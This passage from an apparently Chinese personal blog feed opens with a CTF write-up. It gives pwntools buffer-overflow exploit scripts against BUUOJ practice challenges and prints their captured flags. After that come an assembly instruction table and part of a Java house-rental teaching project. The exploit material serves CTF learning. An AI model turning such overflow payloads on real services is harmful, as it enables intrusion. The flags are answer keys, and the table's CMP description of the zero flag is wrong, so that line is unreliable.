class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctfbox <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#sh = process(&#x27;./buu_ciscn&#x27;)</span></span><br><span class="line">sh = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28163</span>) </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x2c</span>) + p64(<span class="number">0x41348000</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>flag{e0f422e7-ea4f-42ea-b44a-06e07a428334}</p><h1>pwn1_sctf_2016</h1><p>开始同上</p><p>不过这次开了nx保护，而且文件是32位,文件是C++的，需要安装下依赖</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install lib32stdc++6</span><br></pre></td></tr></table></figure><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220416005036554.png" alt=""></p><p>拖进32位ida里面，main函数里面调用了vuln函数，所以来看这个函数，32位字符串不构成栈溢出，看一下这个代码，发现是输入I然后会回复you</p><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220416120214739.png" alt=""></p><p>可以测试一番，如果输入you或者其他返回就是so,XXX</p><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220416115353051.png" alt=""></p><p>我们再输入I看看</p><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220416115512518.png" alt=""></p><p>发现返回的是you</p><p>翻到get_flag函数，里面看到了cat flag.txt，记住和这个地址：8048F13</p><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220416120341750.png" alt=""></p><p>我们输入100个I，发现溢出了，只生成了20个you，所以只需要20个I,因为是32为所以shellcode为20个I加一个4个a也就是4个字节</p><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220416121324052.png" alt=""></p><p>所以exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctfbox <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#sh = process(&#x27;./pwn1&#x27;)</span></span><br><span class="line">sh = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26280</span>)</span><br><span class="line">payload = <span class="string">b&#x27;I&#x27;</span> * <span class="number">20</span> +  <span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span> + p32(<span class="number">0x8048F13</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>flag{c88cc0c1-038f-4205-b341-23a83a681b56}</p>]]></content>
      
      
      <categories>
          
          <category> 比赛wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>汇编常见指令</title>
      <link href="//bfc7703e.html"/>
      <url>//bfc7703e.html</url>
      
        <content type="html"><![CDATA[<table><thead><tr><th style="text-align:center">指令</th><th style="text-align:center">示例</th><th style="text-align:center">含义</th><th style="text-align:center">说明</th></tr></thead><tbody><tr><td style="text-align:center">MOV</td><td style="text-align:center">MOV EAX,ECX</td><td style="text-align:center">EAX = ECX</td><td style="text-align:center">将ECX的值存入EAX</td></tr><tr><td style="text-align:center">ADD</td><td style="text-align:center">ADD EAX,ECX</td><td style="text-align:center">EAX += ECX</td><td style="text-align:center">将EAX的值加上ECX的值</td></tr><tr><td style="text-align:center">SUB</td><td style="text-align:center">SUB EAX,ECX</td><td style="text-align:center">EAX -= ECX</td><td style="text-align:center">将EAX的值减去ECX的值</td></tr><tr><td style="text-align:center">INC</td><td style="text-align:center">INC EAX</td><td style="text-align:center">EAX++</td><td style="text-align:center">将EAX的值加一（+1）</td></tr><tr><td style="text-align:center">DEC</td><td style="text-align:center">DEC EAX</td><td style="text-align:center">EAX- -</td><td style="text-align:center">将EAX的值减一（-1）</td></tr><tr><td style="text-align:center">LEA</td><td style="text-align:center">LEA EAX,[ECX+4]</td><td style="text-align:center">EAX = ECX + 4</td><td style="text-align:center">将ECX+4的值存入EAX</td></tr><tr><td style="text-align:center">CMP</td><td style="text-align:center">CMP EAX,ECX</td><td style="text-align:center">if(EAX == ECX){ZF = 1}else{ZF = 0}</td><td style="text-align:center">将两个值进行比较并根据结果设置标志，若EAX与ECX不同，则ZF = 1，若EAX与ECX不同，则ZF = 0</td></tr><tr><td style="text-align:center">TEST</td><td style="text-align:center">TEST EAX,EAX</td><td style="text-align:center">if(EAX==0){ZF=1}else{ZF=0}</td><td style="text-align:center">将值与0进行比较，并根据结果设置标志，若EAX为0，则ZF=1,若EAX不为0，则ZF=0</td></tr><tr><td style="text-align:center">JE(JZ)</td><td style="text-align:center">JE 04001000</td><td style="text-align:center">if(ZF==1){GOTO 04001000}</td><td style="text-align:center">若ZF为1，则跳转到04001000</td></tr><tr><td style="text-align:center">JNE(JNZ)</td><td style="text-align:center">JNE 04001000</td><td style="text-align:center">if(ZF==0){GOTO 04001000}</td><td style="text-align:center">若ZF为0，则跳转04001000</td></tr><tr><td style="text-align:center">JMP</td><td style="text-align:center">JMP 04001000</td><td style="text-align:center">GOTO 04001000</td><td style="text-align:center">无条件跳转到04001000</td></tr><tr><td style="text-align:center">CALL</td><td style="text-align:center">CALL IstrcmpW</td><td style="text-align:center"></td><td style="text-align:center">调用IstrcmpW</td></tr><tr><td style="text-align:center">PUSH</td><td style="text-align:center">PUSH 00000001</td><td style="text-align:center"></td><td style="text-align:center">将00000001入栈</td></tr><tr><td style="text-align:center">POP</td><td style="text-align:center">POP EAX</td><td style="text-align:center"></td><td style="text-align:center">出栈并将获取的值存入EAX</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> reverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>房屋出租系统</title>
      <link href="//3f7d2995.html"/>
      <url>//3f7d2995.html</url>
      
        <content type="html"><![CDATA[<h1>房屋出租系统项目</h1><h2 id="项目框架">项目框架</h2><ul><li>项目有哪些类？</li><li>明确类与类的调用关系</li></ul><blockquote><p>项目运用的是分层模式，首先该项目的界面写一个界面类（HouseView），显示项目的主菜单，然后该界面主菜单的每一个功能写在服务类上（HouseService），界面菜单上需要的功能要求写在服务类就行了，然后该类下还有一个House对象数组，用于保存和记录有多少个房屋信息，然后该项目准备了一个工具类，utils类（大幅度加快项目的进程，提高开发效率），服务类里面的功能不需要自己写，需要的功能在utils类里面调用就行了，然后还有一个House类，这个类是用一个House对象，将房屋的所有需要用到的属性写在这里比如房屋出租的具体的编号 房主 电话 地址 月租 状态(未出租/已出租)，然后给这个对象赋予构造器，get,set,toSting方法</p></blockquote><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220312092939674.png" alt=""></p><h1>项目完成时的模样</h1><h2 id="项目界面-2">项目界面</h2><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220312093019445.png" alt=""></p><h2 id="项目功能">项目功能</h2><h3 id="房屋列表功能">房屋列表功能</h3><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220312093043535.png" alt=""></p><h3 id="添加房屋功能">添加房屋功能</h3><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220312093137585.png" alt=""></p><h3 id="删除房屋功能">删除房屋功能</h3><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220313150001748.png" alt=""></p><h3 id="查找房屋功能">查找房屋功能</h3><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220312093209925.png" alt=""></p><h3 id="退出房屋系统功能">退出房屋系统功能</h3><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220312093225148.png" alt=""></p><h2 id="项目源码">项目源码</h2><h3 id="HouseView-java类">HouseView.java类</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.thestar0.houserent.view;</span><br><span class="line"><span class="keyword">import</span> com.thestar0.houserent.domain.House;</span><br><span class="line"><span class="keyword">import</span> com.thestar0.houserent.service.HouseService;</span><br><span class="line"><span class="keyword">import</span> com.thestar0.houserent.utils.Utility;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Description（描述）:用于显示房屋出租系统主界面</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@DATe</span>&amp;TIME（创建时间）: 2022/3/9 - 22:23</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Project</span>_name（项目名）: opp2</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Package</span>_name（包名）: com.thestar0.houserent.view</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span>（作者）: thestar</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@version</span>（版本）: 1.0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HouseView</span> </span>&#123;</span><br><span class="line">    <span class="comment">/**控制显示菜单*/</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">boolean</span> loop = <span class="keyword">true</span>;</span><br><span class="line">    <span class="comment">/**接受的用户的选择（1~6*/</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">char</span> key = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">    <span class="comment">/**设置数组的长度为2*/</span></span><br><span class="line">    <span class="keyword">private</span> HouseService houseService = <span class="keyword">new</span> HouseService(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**根据id修改房屋信息*/</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">update</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;=============修改房屋信息============&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;请选择待修改房屋编号(-1表示退出)&quot;</span>);</span><br><span class="line">        <span class="keyword">int</span> updateId = Utility.readInt();</span><br><span class="line">        <span class="keyword">if</span> (updateId == -<span class="number">1</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;=============你放弃修改房屋信息============&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//根据输入得到updateId，查找对象</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//返回的是引用类型[即:就是数组的元素]</span></span><br><span class="line">        <span class="comment">//在后面对house.setXxx() ,就会修改HouseService中houses数组的元素!!!!!!!!!!</span></span><br><span class="line">        House house = houseService.findById(updateId);</span><br><span class="line">        <span class="keyword">if</span> (house == <span class="keyword">null</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;=============修改房屋信息编号不存在..============&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.print(<span class="string">&quot;姓名(&quot;</span> + house.getName() + <span class="string">&quot;): &quot;</span>);</span><br><span class="line">        <span class="comment">//这里如果用户直接回车表示不修改该信息,默认&quot;&quot;</span></span><br><span class="line">        String name = Utility.readString(<span class="number">8</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="string">&quot;&quot;</span>.equals(name)) &#123;</span><br><span class="line">            <span class="comment">//修改</span></span><br><span class="line">            house.setName(name);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.print(<span class="string">&quot;电话(&quot;</span> + house.getPhone() + <span class="string">&quot;):&quot;</span>);</span><br><span class="line">        String phone = Utility.readString(<span class="number">12</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="string">&quot;&quot;</span>.equals(phone)) &#123;</span><br><span class="line">            house.setPhone(phone);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.print(<span class="string">&quot;地址(&quot;</span> + house.getAddress() + <span class="string">&quot;): &quot;</span>);</span><br><span class="line">        String address = Utility.readString(<span class="number">18</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="string">&quot;&quot;</span>.equals(address)) &#123;</span><br><span class="line">            house.setAddress(address);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.print(<span class="string">&quot;租金(&quot;</span> + house.getRent() + <span class="string">&quot;):&quot;</span>);</span><br><span class="line">        <span class="keyword">int</span> rent = Utility.readInt(-<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (rent != -<span class="number">1</span>) &#123;</span><br><span class="line">            house.setRent(rent);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.print(<span class="string">&quot;状态(&quot;</span> + house.getState() + <span class="string">&quot;):&quot;</span>);</span><br><span class="line">        String state = Utility.readString(<span class="number">3</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="string">&quot;&quot;</span>.equals(state)) &#123;</span><br><span class="line">            house.setState(state);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;=============修改房屋信息成功============&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**根究id查找房屋信息*/</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">FindHouse</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;=============查找房屋信息============&quot;</span>);</span><br><span class="line">        System.out.print(<span class="string">&quot;请输入要查找的id: &quot;</span>);</span><br><span class="line">        <span class="keyword">int</span> findId = Utility.readInt();</span><br><span class="line">        <span class="comment">//调用方法</span></span><br><span class="line">        House house = houseService.findById(findId);</span><br><span class="line">        <span class="keyword">if</span> (house != <span class="keyword">null</span>) &#123;</span><br><span class="line">            System.out.println(house);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;=============查找房屋信息id不存在============&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**完成退出确认*/</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">exit</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="comment">/*这里使用Utility提供方法，完成确认*/</span></span><br><span class="line">        <span class="keyword">char</span> c = Utility.readConfirmSelection();</span><br><span class="line">        <span class="keyword">if</span>(c == <span class="string">&#x27;Y&#x27;</span>) &#123;</span><br><span class="line">            loop = <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**编写delHouse()接受输入的id,调用Service 的del方法*/</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">delHouse</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;=============删除房屋信息============&quot;</span>);</span><br><span class="line">        System.out.print(<span class="string">&quot;请输入待删除房屋的编号(-1退出):&quot;</span>);</span><br><span class="line">        <span class="keyword">int</span> delId = Utility.readInt();</span><br><span class="line">        <span class="keyword">if</span> (delId == -<span class="number">1</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;=============放弃删除房屋信息============&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//注意该方法本身就有循环判断的逻辑,必须输出Y/N</span></span><br><span class="line">        <span class="keyword">char</span> choice = Utility.readConfirmSelection();</span><br><span class="line">        <span class="keyword">if</span> (choice == <span class="string">&#x27;Y&#x27;</span>) &#123;</span><br><span class="line">            <span class="comment">//真的删除</span></span><br><span class="line">            <span class="keyword">if</span> (houseService.del(delId)) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;=============删除房屋信息成功============&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;=============房屋编号不存在，删除失败============&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;=============放弃删除房屋信息============&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**编写addHouse()接受输入，创建House对象，调用add方法*/</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addHouse</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;=============添加房屋============&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;姓名：&quot;</span>);</span><br><span class="line">        String name = Utility.readString(<span class="number">8</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;电话：&quot;</span>);</span><br><span class="line">        String phone = Utility.readString(<span class="number">12</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;地址：&quot;</span>);</span><br><span class="line">        String address = Utility.readString(<span class="number">16</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;月租：&quot;</span>);</span><br><span class="line">        <span class="keyword">int</span> rent = Utility.readInt();</span><br><span class="line">        System.out.println(<span class="string">&quot;状态：&quot;</span>);</span><br><span class="line">        String state = Utility.readString(<span class="number">3</span>);</span><br><span class="line">        <span class="comment">//创建一个新的House对象，注意id 是系统分配的，用户不能输入</span></span><br><span class="line">        House newHouse = <span class="keyword">new</span> House(<span class="number">0</span>, name, phone, address, rent, state);</span><br><span class="line">        <span class="keyword">if</span>(houseService.add(newHouse))&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;=============添加房屋成功============&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;=============添加房屋失败============&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**编写ListHouse()方法显示房屋列表*/</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">ListHouse</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;=============房屋列表============ &quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;编号\t房主\t电话\t地址\t月租\t状态(未出租/已出租)&quot;</span>);</span><br><span class="line">        House[] houses = houseService.list();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; houses.length; i++) &#123;</span><br><span class="line">            <span class="comment">//如果为空就不用显示了</span></span><br><span class="line">            <span class="keyword">if</span>(houses[i] == <span class="keyword">null</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(houses[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;==========房屋列表显示完毕==============&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">/**显示主菜单*/</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">mainMenu</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;\n=============房屋出租系统菜单============&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;\t\t\t1 新 增  房 源&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;\t\t\t2 查 找  房 屋&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;\t\t\t3 删 除  房 屋 信 息&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;\t\t\t4 修 改  房 屋 信 息&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;\t\t\t5 房 屋 列 表&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;\t\t\t6 退       出 &quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;请输入你的选择（1~6）:&quot;</span>);</span><br><span class="line">            key = Utility.readChar();</span><br><span class="line">            <span class="keyword">switch</span> (key)&#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">                    addHouse();</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;2&#x27;</span>:</span><br><span class="line">                    FindHouse();</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;3&#x27;</span>:</span><br><span class="line">                    delHouse();</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;4&#x27;</span>:</span><br><span class="line">                    update();</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;5&#x27;</span>:</span><br><span class="line">                    ListHouse();</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;6&#x27;</span>:</span><br><span class="line">                    exit();</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">while</span> (loop);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="HouseService-java类">HouseService.java类</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.thestar0.houserent.service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.thestar0.houserent.domain.House;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Description（描述）:HouseService.java【业务】定义一个House[]，</span></span><br><span class="line"><span class="comment"> * 保存House对象</span></span><br><span class="line"><span class="comment"> * 响应HouseView的调用</span></span><br><span class="line"><span class="comment"> * 完成对房屋信息的各种操作（增删改查）c[create]r[read]u[update]d[delete]</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@DATe</span>&amp;TIME（创建时间）: 2022/3/10 - 23:21</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Project</span>_name（项目名）: opp2</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Package</span>_name（包名）: com.thestar0.houserent.service</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span>（作者）: thestar</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@version</span>（版本）: 1.0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HouseService</span> </span>&#123;</span><br><span class="line">    <span class="comment">/**保存house对象*/</span></span><br><span class="line">    <span 